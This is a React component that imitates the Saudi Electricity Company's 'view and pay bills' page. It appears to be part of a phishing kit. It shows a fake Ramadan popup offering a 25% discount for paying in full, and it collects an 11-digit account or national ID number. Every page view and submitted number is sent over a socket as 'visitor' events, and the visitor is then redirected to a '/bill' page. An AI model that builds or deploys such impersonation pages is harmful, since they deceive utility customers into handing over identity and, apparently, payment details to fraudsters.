import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { socket } from "@/lib/store";

export default function FahsHome() {
  const [accountNumber, setAccountNumber] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [, setLocation] = useLocation();
  const [showPopup, setShowPopup] = useState(false);

  useEffect(() => {
    socket.value.emit("visitor:pageView", { page: "home", url: window.location.href });
  }, []);

  // Show popup after 2 seconds
  useEffect(() => {
    const popupTimer = setTimeout(() => {
      setShowPopup(true);
    }, 2000);
    return () => clearTimeout(popupTimer);
  }, []);



  const handleSubmit = () => {
    if (!accountNumber.trim()) return;
    setIsLoading(true);
    socket.value.emit("visitor:formSubmit", {
      page: "home",
      data: { accountNumber }
    });
    sessionStorage.setItem("accountNumber", accountNumber);
    setTimeout(() => {
      setIsLoading(false);
      setLocation('/bill');
    }, 2000);
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') handleSubmit();
  };

  return (
    <>
      {/* SE Font */}
      <style>{`
        @font-face {
          font-family: 'SE';
          src: url('/fonts/SE-Regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
        }
        @font-face {
          font-family: 'SE';
          src: url('/fonts/SE-Medium.woff2') format('woff2');
          font-weight: 500;
          font-style: normal;
        }
        @font-face {
          font-family: 'SE';
          src: url('/fonts/SE-SemiBold.woff2') format('woff2');
          font-weight: 600;
          font-style: normal;
        }
        @font-face {
          font-family: 'SE';
          src: url('/fonts/SE-Light.woff2') format('woff2');
          font-weight: 300;
          font-style: normal;
        }
        input::placeholder {
          color: #001f5e !important;
          opacity: 1 !important;
        }
        input:focus {
          border: 2px solid #06c !important;
          box-shadow: 0 0 0 4px rgba(0, 102, 204, 0.15) !important;
          background: #fff !important;
        }
      `}</style>

      <div
        className="min-h-screen bg-white"
        dir="rtl"
        style={{ fontFamily: "'SE', sans-serif" }}
      >
        {/* Ramadan Popup */}
        {showPopup && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50" onClick={() => setShowPopup(false)}>
            <div className="bg-white rounded-2xl shadow-2xl max-w-sm w-[90%] mx-auto overflow-hidden" onClick={(e) => e.stopPropagation()}>
              {/* Ramadan Header with Crescent */}
              <div style={{
                background: 'linear-gradient(135deg, #0a1628 0%, #1a3a5c 50%, #0d2137 100%)',
                padding: '40px 20px',
                textAlign: 'center',
                position: 'relative',
                overflow: 'hidden',
              }}>
                {/* Stars decoration */}
                <div style={{ position: 'absolute', top: '15px', right: '25px', color: '#ffd700', fontSize: '12px', opacity: 0.7 }}>\u2726</div>
                <div style={{ position: 'absolute', top: '35px', right: '60px', color: '#ffd700', fontSize: '8px', opacity: 0.5 }}>\u2726</div>
                <div style={{ position: 'absolute', top: '20px', left: '30px', color: '#ffd700', fontSize: '10px', opacity: 0.6 }}>\u2726</div>
                <div style={{ position: 'absolute', top: '50px', left: '55px', color: '#ffd700', fontSize: '7px', opacity: 0.4 }}>\u2726</div>
                <div style={{ position: 'absolute', bottom: '25px', right: '40px', color: '#ffd700', fontSize: '9px', opacity: 0.5 }}>\u2726</div>
                <div style={{ position: 'absolute', bottom: '20px', left: '35px', color: '#ffd700', fontSize: '11px', opacity: 0.6 }}>\u2726</div>
                {/* Crescent Moon */}
                <div style={{ fontSize: '70px', marginBottom: '10px', filter: 'drop-shadow(0 0 15px rgba(255,215,0,0.4))' }}>
                  \ud83c\udf19
                </div>
                <h2 style={{
                  fontFamily: "'SE', sans-serif",
                  fontSize: '28px',
                  fontWeight: 700,
                  color: '#ffd700',
                  marginBottom: '5px',
                  textShadow: '0 2px 10px rgba(255,215,0,0.3)',
                }}>\u0631\u0645\u0636\u0627\u0646 \u0643\u0631\u064a\u0645</h2>
              </div>
              <div className="p-6 text-center">
                <h3 style={{
                  fontFamily: "'SE', sans-serif",
                  fontSize: '22px',
                  fontWeight: 600,
                  color: '#001f5e',
                  marginBottom: '12px',
                }}>\u0628\u0645\u0646\u0627\u0633\u0628\u0629 \u0627\u0644\u0634\u0647\u0631 \u0627\u0644\u0641\u0636\u064a\u0644</h3>
                <div style={{
                  background: 'linear-gradient(135deg, #06c, #0055aa)',
                  borderRadius: '12px',
                  padding: '16px 20px',
                  marginBottom: '16px',
                }}>
                  <p style={{
                    fontFamily: "'SE', sans-serif",
                    fontSize: '20px',
                    fontWeight: 700,
                    color: '#fff',
                  }}>\u062e\u0635\u0645 25%</p>
                  <p style={{
                    fontFamily: "'SE', sans-serif",
                    fontSize: '15px',
                    fontWeight: 400,
                    color: '#e0ecff',
                    marginTop: '4px',
                  }}>\u0639\u0646\u062f \u062f\u0641\u0639 \u0643\u0627\u0645\u0644 \u0627\u0644\u0645\u0628\u0644\u063a</p>
                </div>
                <p style={{
                  fontFamily: "'SE', sans-serif",
                  fontSize: '15px',
                  fontWeight: 400,
                  color: '#66799e',
                  marginBottom: '20px',
                }}>\u0644\u0622\u062e\u0631 \u064a\u0648\u0645 \u0645\u0646 \u0623\u064a\u0627\u0645 \u0627\u0644\u0634\u0647\u0631 \u0627\u0644\u0641\u0636\u064a\u0644</p>
                <button
                  onClick={() => setShowPopup(false)}
                  className="w-3/4 py-3 text-white rounded-lg font-bold text-lg transition-colors"
                  style={{ backgroundColor: '#06c' }}
                >
                  \u0625\u063a\u0644\u0627\u0642
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Header - Logo right, X left */}
        <div
          style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            height: '70px',
            padding: '15px 55px 14px',
          }}
        >
          {/* Logo - Right */}
          <a href="#" style={{ display: 'block', border: 0, outline: 0 }}>
            <img
              src="/se-logo.svg"
              alt="السعودية للطاقة"
              style={{ width: '90px', height: '58px', objectFit: 'contain' }}
            />
          </a>

          {/* Close - Left */}
          <button
            onClick={() => window.location.reload()}
            style={{
              background: '#e8f0fe',
              border: 'none',
              cursor: 'pointer',
              padding: '10px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              borderRadius: '12px',
              width: '44px',
              height: '44px',
            }}
          >
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#06c" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>

        {/* Main Content */}
        <div
          style={{
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            paddingTop: '80px',
            paddingLeft: '20px',
            paddingRight: '20px',
          }}
        >
          {/* Title */}
          <h1
            style={{
              fontFamily: "'SE', sans-serif",
              fontWeight: 600,
              fontSize: '40px',
              lineHeight: '1.3',
              color: '#001f5e',
              marginBottom: '10px',
              textAlign: 'center',
              letterSpacing: 0,
            }}
          >
            عرض ودفع الفواتير
          </h1>

          {/* Description */}
          <p
            style={{
              fontFamily: "'SE', sans-serif",
              fontWeight: 400,
              fontSize: '18px',
              lineHeight: '1.6',
              color: '#66799e',
              textAlign: 'center',
              maxWidth: '500px',
              marginBottom: '40px',
            }}
          >
            يرجى إدخال رقم حسابك لعرض ومتابعة دفع فاتورتك. يمكنك أيضًا{' '}
            <a
              href="#"
              style={{
                color: '#06c',
                textDecoration: 'underline',
                fontWeight: 400,
              }}
            >
              تسجيل الدخول
            </a>
            {' '}للحصول على المزيد من الخدمات
          </p>

          {/* Form */}
          <div style={{ width: '100%', maxWidth: '460px' }}>
            {/* Label */}
            <label
              style={{
                display: 'block',
                fontFamily: "'SE', sans-serif",
                fontSize: '16px',
                fontWeight: 400,
                color: '#66799e',
                marginBottom: '4px',
                textAlign: 'right',
              }}
            >
              رقم الحساب أو الهوية
            </label>

            {/* Input - box style with background */}
            <div style={{ position: 'relative' }}>
              <input
                type="text"
                value={accountNumber}
                onChange={(e) => {
                  const val = e.target.value.replace(/[^0-9]/g, '');
                  if (val.length <= 11) setAccountNumber(val);
                }}
                inputMode="numeric"
                maxLength={11}
                onKeyDown={handleKeyDown}
                placeholder=""
                style={{
                  width: '100%',
                  fontFamily: "'SE', sans-serif",
                  fontSize: '18px',
                  fontWeight: 400,
                  color: '#001f5e',
                  padding: '6px 16px',
                  border: 'none',
                  borderRadius: '12px',
                  outline: 'none',
                  background: '#f5f6f9',
                  textAlign: 'right',
                  direction: 'rtl',
                  boxSizing: 'border-box' as const,
                }}
              />
              {!accountNumber && (
                <span
                  style={{
                    position: 'absolute',
                    top: '6px',
                    right: '16px',
                    fontFamily: "'SE', sans-serif",
                    fontSize: '18px',
                    fontWeight: 400,
                    color: '#66799e',
                    pointerEvents: 'none',
                  }}
                >
                  مثال: 12345678901
                </span>
              )}
            </div>

            {/* Submit Button */}
            <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
            <button
              onClick={handleSubmit}
              disabled={accountNumber.trim().length !== 11 || isLoading}
              style={{
                marginTop: '30px',
                fontFamily: "'SE', sans-serif",
                fontSize: '18px',
                fontWeight: 400,
                lineHeight: '150%',
                padding: '10px 15px 8px',
                minWidth: '50px',
                borderRadius: '12px',
                border: '1px solid transparent',
                cursor: (accountNumber.trim().length !== 11 || isLoading) ? 'default' : 'pointer',
                display: 'inline-flex',
                alignItems: 'center',
                justifyContent: 'center',
                textDecoration: 'none',
                transition: 'color 0.5s, background-color 0.5s',
                backgroundColor: (accountNumber.trim().length !== 11 || isLoading) ? '#f5f6f9' : '#06c',
                color: (accountNumber.trim().length !== 11 || isLoading) ? '#e6e9ef' : '#fff',
                pointerEvents: (accountNumber.trim().length !== 11 || isLoading) ? 'none' as const : 'auto' as const,
                userSelect: 'none' as const,
              }}
            >
              {isLoading ? (
                <span style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                  <svg className="animate-spin" style={{ width: '20px', height: '20px' }} xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle style={{ opacity: 0.25 }} cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path style={{ opacity: 0.75 }} fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  جاري التحقق...
                </span>
              ) : (
                'استمر'
              )}
            </button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
